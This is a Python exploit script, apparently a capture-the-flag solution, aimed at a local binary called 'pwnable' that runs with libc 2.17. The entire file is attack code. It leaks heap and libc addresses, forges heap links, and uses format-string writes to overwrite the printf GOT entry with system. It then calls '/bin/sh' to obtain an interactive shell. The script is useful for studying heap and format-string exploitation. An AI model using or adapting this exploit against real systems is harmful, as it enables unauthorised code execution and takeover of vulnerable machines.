from ptrlib import *

def add_name(name):
    sock.recvuntil(">")
    sock.sendline("1")
    sock.recvline()
    sock.sendline(name)

def add_item(item):
    sock.recvuntil(">")
    sock.sendline("2")
    sock.sendline(str(item))

def view_order(item):
    sock.recvuntil(">")
    sock.sendline("4")
    sock.recvuntil("Item #" + str(item) + ": ")
    return sock.recvline().rstrip()

def remove_item(item):
    sock.recvuntil(">")
    sock.sendline("3")
    sock.sendline(str(item))

elf = ELF("./pwnable")
libc = ELF("./libc-2.17.so")

sock = Socket("127.0.0.1", 9001)
_ = input()

# leak heap address
add_item(3)
add_item(0)
item = view_order(0)
addr_heap = u64(item[0x18:])
dump("heap = " + hex(addr_heap)) # address to the name of item[1]
addr_cart0 = addr_heap - 0x70 + 0x10

# forgery name link
fake_name = b'A' * 0x18
fake_name += p64(addr_cart0)
remove_item(1)
add_name(fake_name) # addr_heap

# malloc for FSB
# cart->first --> name0 --> name1 --> name2 --> name2 --> ...
payload = b"%2$p"
payload += b'.' * (0x18 - len(payload))
payload += p64(addr_heap + 0xc0)
add_name(payload) # addr_heap + 0x60: item0
payload = str2bytes("%{}c%16$n".format(elf.got("printf")))
payload += b'.' * (0x18 - len(payload))
payload += p64(addr_heap + 0x120)
add_name(payload) # addr_heap + 0xc0: item1
payload = b'X' * 0x18
payload += p64(addr_heap + 0x120)
add_name(payload) # addr_heap + 0x120: item2, item3, ...

# cart overlap
fake_cart = b''
fake_cart += p64(addr_heap + 0x60)
fake_cart += p64(addr_heap + 0x60)
fake_cart += p64(addr_heap)
fake_cart += p64(8)
remove_item(2)
add_name(fake_cart)

# 1st FSB
addr_IO_stdfile_1_lock = int(view_order(0).split(b'.')[0], 16)
libc_base = addr_IO_stdfile_1_lock - libc.symbol('_IO_stdfile_1_lock')
addr_system = libc_base + libc.symbol("system")
dump("libc_base = " + hex(libc_base))

# malloc for FSB
a = sock.recvonce(elf.got("printf"))
remove_item(6) # last item
payload = str2bytes("%{}c%24$n".format(addr_system & 0xffffffff))
payload += b'.' * (0x18 - len(payload))
payload += p64(addr_heap + 0x1e0)
add_name(payload) # addr_heap + 0x120: item0
payload = b'A' * 0x18
payload += p64(addr_heap + 0x240)
add_name(payload) # addr_heap + 0x1e0: item1
payload = b'B' * 0x18
payload += p64(addr_heap + 0x2a0)
add_name(payload) # addr_heap + 0x240: item2
payload = b'C' * 0x18
payload += p64(addr_heap + 0x300)
add_name(payload) # addr_heap + 0x2a0: item3
payload = b'/bin/sh\x00'
add_name(payload) # addr_heap + 0x300: item3
remove_item(1)
remove_item(2)

# 2nd FSB
sock.recv()
view_order(0)
sock.recvonce(addr_system & 0xffffffff)

# get the shell!
dump("OK!", "success")

sock.interactive()
